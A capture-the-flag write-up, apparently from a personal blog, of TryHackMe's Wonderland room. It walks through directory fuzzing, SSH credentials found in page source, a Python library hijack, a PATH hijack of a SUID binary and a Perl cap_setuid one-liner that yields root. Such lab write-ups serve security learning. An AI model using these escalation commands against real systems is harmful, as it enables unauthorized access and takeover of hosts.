<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dawnl3ss :: Wonderland THM Write-Up</title>

    <meta property="og:title" content="Dawnless | Wonderland THM Write-Up">
    <meta property="og:image" content="https://dawnless.me/public/img/ogimage.jpg">
    <meta property="og:description" content="Wonderland TryHackMe Write-Up by Dawnl3ss. Dir fuzzing + Python lib hijack + PATH hijack + Perl cap_setuid.">
    <meta name="author" content="Dawnless">

    <link rel="icon" href="/public/img/icon.jpg" type="image/png">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;600&display=swap">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/MaterialDesign-Webfont/7.4.47/css/materialdesignicons.min.css">
    <link rel="stylesheet" href="/public/css/components/wtpage.css">
</head>
<body>

<header class="header" id="header">
    <div class="container">
        <nav class="nav">
            <a href="/" class="nav-logo">
                <img src="/public/img/icon.jpg" alt="Dawnl3ss">
                <div class="logo-text">dawnl3ss<span>@parrot</span></div>
            </a>
            <ul class="nav-list" id="navList">
                <li><a href="/" class="nav-link">Home</a></li>
                <li><a href="/writeups" class="nav-link">Writeups</a></li>
                <li><a href="#recon" class="nav-link">Recon</a></li>
                <li><a href="#access" class="nav-link">Access</a></li>
                <li><a href="#latmov" class="nav-link">Lat Mov</a></li>
                <li><a href="#privesc" class="nav-link">PrivEsc</a></li>
            </ul>
            <button class="nav-toggle" id="navToggle" aria-label="Toggle menu">
                <span></span><span></span><span></span>
            </button>
        </nav>
    </div>
</header>

<section class="writeup-hero">
    <div class="container hero-inner">
        <div class="breadcrumb">
            <a href="/"><i class="mdi mdi-home"></i> Home</a>
            <i class="mdi mdi-chevron-right"></i>
            <a href="/writeups">Writeups</a>
            <i class="mdi mdi-chevron-right"></i>
            <span>Wonderland</span>
        </div>

        <div class="writeup-banner">
            <img
                class="box-avatar"
                src="https://tryhackme-images.s3.amazonaws.com/room-icons/fdba6eaf85513262b2a9b12875b0f342.jpeg"
                alt="Wonderland THM"
            >
            <div class="writeup-meta">
                <h1>THM - <span>Wonderland</span> Write-Up</h1>
                <div class="meta-row">
                    <span class="meta-badge difficulty-medium"><i class="mdi mdi-circle-slice-4"></i> Medium</span>
                    <span class="meta-badge os-linux"><i class="mdi mdi-linux"></i> Linux</span>
                    <span class="meta-badge type-web"><i class="mdi mdi-web"></i> Web App</span>
                    <span class="meta-badge platform"><i class="mdi mdi-flag-checkered"></i> TryHackMe</span>
                </div>
                <div class="tag-list">
                    <span class="tag">ctf</span>
                    <span class="tag">alice-in-wonderland</span>
                    <span class="tag">privesc</span>
                    <span class="tag">linux</span>
                    <span class="tag">python-hijack</span>
                    <span class="tag">path-hijack</span>
                    <span class="tag">capabilities</span>
                </div>
            </div>
        </div>
    </div>
</section>

<div class="writeup-layout">

    <aside class="toc-sidebar">
        <nav class="toc-box">
            <p class="toc-title"><i class="mdi mdi-format-list-bulleted"></i> Contents</p>
            <ul class="toc-list">
                <li><a href="#intro"><i class="mdi mdi-information-outline"></i> Introduction</a></li>
                <li><a href="#recon"><i class="mdi mdi-radar"></i> Reconnaissance</a></li>
                <li><a href="#access"><i class="mdi mdi-console"></i> Gaining Access</a></li>
                <li><a href="#latmov"><i class="mdi mdi-swap-horizontal"></i> Lateral Movement</a></li>
                <li><a href="#privesc"><i class="mdi mdi-crown-outline"></i> Privilege Escalation</a></li>
            </ul>
        </nav>
    </aside>

    <main class="writeup-content">

        <section class="wt-section" id="intro">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-information-outline"></i></div>
                <div>
                    <span class="section-num">01 /</span>
                    <h2>Introduction</h2>
                </div>
            </div>

            <p>
                <a href="https://tryhackme.com/room/wonderland" target="_blank">Wonderland</a> is a free room on TryHackMe.
                The objective is to compromise the target and retrieve both the user and root flags.
            </p>

            <div class="box-info-card">
                <div class="box-info-item">
                    <i class="mdi mdi-flag-variant"></i>
                    <span class="bi-label">Name</span>
                    <span class="bi-value">Wonderland</span>
                </div>
                <div class="box-info-item">
                    <i class="mdi mdi-gauge"></i>
                    <span class="bi-label">Difficulty</span>
                    <span class="bi-value" style="color:#ffbd2e">Medium</span>
                </div>
                <div class="box-info-item">
                    <i class="mdi mdi-linux"></i>
                    <span class="bi-label">OS</span>
                    <span class="bi-value">Linux</span>
                </div>
                <div class="box-info-item">
                    <i class="mdi mdi-web"></i>
                    <span class="bi-label">Type</span>
                    <span class="bi-value">Web App</span>
                </div>
            </div>

            <p>Let's dive into the challenge!</p>
        </section>

        <section class="wt-section" id="recon">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-radar"></i></div>
                <div>
                    <span class="section-num">02 /</span>
                    <h2>Reconnaissance</h2>
                </div>
            </div>

            <p>After adding the machine to <code class="inline">/etc/hosts</code>, NMAP shows only two ports open:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">nmap scan</span>
                    <button class="tb-copy" data-target="cmd1">copy</button>
                </div>
                <pre id="cmd1"><span class="prompt">$</span> <span class="cmd">nmap -A wonderland.thm</span>
<span class="output">PORT   STATE SERVICE VERSION
<span class="success">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3</span>
<span class="success">80/tcp open  http    Golang net/http server</span>
|_http-title: Follow the white rabbit.</span></pre>
            </div>

            <div class="writeup-img-wrap">
                <img src="/public/img/thm/wonderland/1.png" alt="Wonderland homepage">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// wonderland.thm - homepage with the hint "Follow the white Rabbit"</div>
            </div>

            <p>Nothing visible on the surface. I ran FFUF with recursion to map the directory tree:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">ffuf - recursive dir fuzzing</span>
                    <button class="tb-copy" data-target="cmd2">copy</button>
                </div>
                <pre id="cmd2"><span class="prompt">$</span> <span class="cmd">ffuf -u http://wonderland.thm/FUZZ -w /usr/share/dirb/wordlists/common.txt -c -t 150 -recursion</span>
<span class="output">r                       [Status: 301]
r/a                     [Status: 301]
r/a/b                   [Status: 301]
r/a/b/b                 [Status: 301]
r/a/b/b/i               [Status: 301]
<span class="success">r/a/b/b/i/t             [Status: 301]</span>
r/a/b/b/i/t/index.html  [Status: 301]</span></pre>
            </div>

            <div class="callout info">
                <i class="mdi mdi-rabbit"></i>
                <p>The path spells out <strong>/r/a/b/b/i/t/</strong> - following the white rabbit.</p>
            </div>
        </section>

        <section class="wt-section" id="access">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-console"></i></div>
                <div>
                    <span class="section-num">03 /</span>
                    <h2>Gaining Access</h2>
                </div>
            </div>

            <p>Visiting <code class="inline">/r/a/b/b/i/t/</code> shows a plain page, but the source code reveals SSH credentials:</p>

            <div class="writeup-img-wrap">
                <img src="/public/img/thm/wonderland/2.png" alt="Rabbit page">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// /r/a/b/b/i/t/ - page content</div>
            </div>

            <div class="writeup-img-wrap">
                <img src="/public/img/thm/wonderland/3.png" alt="Credentials in source code">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// Page source - SSH credentials hidden in HTML</div>
            </div>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">SSH login as alice</span>
                    <button class="tb-copy" data-target="cmd3">copy</button>
                </div>
                <pre id="cmd3"><span class="prompt">$</span> <span class="cmd">ssh alice@wonderland.thm</span>
<span class="output">alice@wonderland.thm's password:
Welcome to Ubuntu 18.04.4 LTS
<span class="success">alice@wonderland:~$</span></span></pre>
            </div>
        </section>

        <section class="wt-section" id="latmov">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-swap-horizontal"></i></div>
                <div>
                    <span class="section-num">04 /</span>
                    <h2>Lateral Movement</h2>
                </div>
            </div>

            <p>Alice can run a Python script as <code class="inline">rabbit</code> via sudo:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">sudo -l + Python library hijack</span>
                    <button class="tb-copy" data-target="cmd4">copy</button>
                </div>
                <pre id="cmd4"><span class="output">alice@wonderland:~$</span> <span class="cmd">sudo -l</span>
<span class="output">User alice may run the following commands on wonderland:
<span class="success">    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py</span></span></pre>
            </div>

            <div class="callout info">
                <i class="mdi mdi-lightbulb-outline"></i>
                <p>The script imports the <code class="inline">random</code> module. Since Alice has write access to the current directory, I can create a fake <code class="inline">random.py</code> that Python will load first - a classic library hijack.</p>
            </div>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">fake random.py -> rabbit</span>
                    <button class="tb-copy" data-target="cmd5">copy</button>
                </div>
                <pre id="cmd5"><span class="output">alice@wonderland:~$</span> <span class="cmd">cat random.py</span>
<span class="output">import os

def choice(str):
    os.system("/bin/bash")</span>

<span class="output">alice@wonderland:~$</span> <span class="cmd">sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py</span>
<span class="output"><span class="success">rabbit@wonderland:~$</span>

rabbit@wonderland:~$</span> <span class="cmd">id</span>
<span class="output">uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)</span></pre>
            </div>

            <p>As <code class="inline">rabbit</code>, I find a SUID binary called <code class="inline">teaParty</code>. Downloading and running <code class="inline">strings</code> on it reveals it calls <code class="inline">date</code> without a full path - vulnerable to PATH hijacking:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">strings teaParty - date binary call</span>
                    <button class="tb-copy" data-target="cmd6">copy</button>
                </div>
                <pre id="cmd6"><span class="prompt">$</span> <span class="cmd">strings teaParty</span>
<span class="output">Welcome to the tea party!
The Mad Hatter will be here soon.
<span class="warning">/bin/echo -n 'Probably by ' && date --date='next hour' -R</span>
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)</span></pre>
            </div>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">PATH hijack -> hatter</span>
                    <button class="tb-copy" data-target="cmd7">copy</button>
                </div>
                <pre id="cmd7"><span class="output">rabbit@wonderland:~$</span> <span class="cmd">export PATH=/tmp:$PATH</span>
<span class="output">rabbit@wonderland:~$</span> <span class="cmd">echo '/bin/bash' > /tmp/date && chmod 777 /tmp/date</span>
<span class="output">rabbit@wonderland:~$</span> <span class="cmd">./teaParty</span>
<span class="output">Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by
<span class="success">hatter@wonderland:/home/rabbit$</span></span>

<span class="output">hatter@wonderland:/home/hatter$</span> <span class="cmd">cat password.txt</span>
<span class="output"><span class="success">[REDACTED]</span></span></pre>
            </div>
        </section>

        <section class="wt-section" id="privesc">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-crown-outline"></i></div>
                <div>
                    <span class="section-num">05 /</span>
                    <h2>Privilege Escalation</h2>
                </div>
            </div>

            <p>Checking Linux capabilities reveals <code class="inline">cap_setuid</code> on Perl:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">getcap - Perl cap_setuid</span>
                    <button class="tb-copy" data-target="cmd8">copy</button>
                </div>
                <pre id="cmd8"><span class="output">hatter@wonderland:~$</span> <span class="cmd">getcap / -r 2>/dev/null</span>
<span class="output"><span class="success">/usr/bin/perl5.26.1 = cap_setuid+ep</span>
/usr/bin/mtr-packet = cap_net_raw+ep
<span class="success">/usr/bin/perl = cap_setuid+ep</span></span></pre>
            </div>

            <div class="callout info">
                <i class="mdi mdi-lightbulb-outline"></i>
                <p><code class="inline">cap_setuid</code> allows Perl to change its UID to 0. GTFOBins documents the exact one-liner to abuse this.</p>
            </div>

            <div class="writeup-img-wrap">
                <img src="/public/img/thm/wonderland/perl-cap.png" alt="GTFOBins Perl cap_setuid">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// GTFOBins - Perl cap_setuid privilege escalation</div>
            </div>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">Perl cap_setuid -> root + flags</span>
                    <button class="tb-copy" data-target="cmd9">copy</button>
                </div>
                <pre id="cmd9"><span class="output">hatter@wonderland:~$</span> <span class="cmd">perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'</span>
<span class="output"><span class="success"># id</span>
uid=0(root) gid=1003(hatter) groups=1003(hatter)

# cat /root/user.txt
<span class="success">thm{REDACTED}</span>

# cat /home/alice/root.txt
<span class="success">thm{REDACTED}</span></span></pre>
            </div>

            <div class="callout success">
                <i class="mdi mdi-crown"></i>
                <p><strong>Both flags captured!</strong> Box fully pwned via dir fuzzing -> hidden SSH creds -> Python lib hijack -> PATH hijack -> Perl cap_setuid. 💀</p>
            </div>
        </section>

    </main>
</div>

<footer class="footer">
    <div class="container footer-content">
        <div class="footer-social">
            <a href="https://github.com/dawnl3ss/" target="_blank"><i class="mdi mdi-github"></i></a>
            <a href="https://discord.gg/hardware" target="_blank"><i class="mdi mdi-discord"></i></a>
            <a href="http://dawnl3ss.me/" target="_blank"><i class="mdi mdi-web"></i></a>
            <a href="https://twitter.com/dawnl3ss" target="_blank"><i class="mdi mdi-twitter"></i></a>
        </div>
        <nav class="footer-nav">
            <a href="/">Home</a>
            <a href="/writeups">Writeups</a>
            <a href="mailto:dawnl3ss@protonmail.com">Contact</a>
        </nav>
        <p class="footer-copyright">Copyright Dawnl3ss © 2025 - <span style="color:var(--primary)">dawnl3ss@parrot-sec</span></p>
    </div>
</footer>

<div class="lightbox-overlay" id="lightbox">
    <button class="lightbox-close" id="lightboxClose">&times;</button>
    <img class="lightbox-img" id="lightboxImg" src="" alt="">
</div>

<script src="/public/js/wtpage.js"></script>
</body>
</html>